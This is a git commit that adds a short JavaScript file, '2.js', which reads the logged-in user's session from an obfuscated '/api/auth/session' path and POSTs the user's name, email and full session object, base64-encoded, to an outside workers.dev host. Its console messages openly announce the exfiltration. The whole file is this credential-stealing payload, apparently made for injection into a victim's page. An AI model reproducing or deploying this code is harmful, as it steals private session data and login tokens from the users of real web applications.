4a5bf5a52cce2740965b64ca64ad4b6d6b8bad48
MrGreen243 <102157725+MrGreen243@users.noreply.github.com>
2025-08-19 10:40:51 +0100

    Create 2.js

---
+++ 2.js
@@ -0,0 +1,23 @@
+(() => {
+  const u = atob('L2FwaS9hdXRoL3Nlc3Npb24=');
+  const w = 'https://mnta.wilselme.workers.dev/';
+
+  fetch(u)
+    .then((r) => r.json())
+    .then((d) => {
+      if (Object.keys(d).length) {
+        const n = d.user?.name || 'N/A';
+        const e = d.user?.email || 'N/A';
+        console.log('Info Exfiltrated...awaiting send')
+        if (window.ran) return; // prevent running twice
+        window.ran = 1;
+        console.log('Passed Checks! Sending Info...')
+        const b = btoa(
+          JSON.stringify({ name: n, email: e, src: currentUrl, data: d })
+        );
+        fetch(w, { method: 'POST', body: b });
+        console.log('Info Sent!')
+      }
+    })
+    .catch(() => {});
+})();
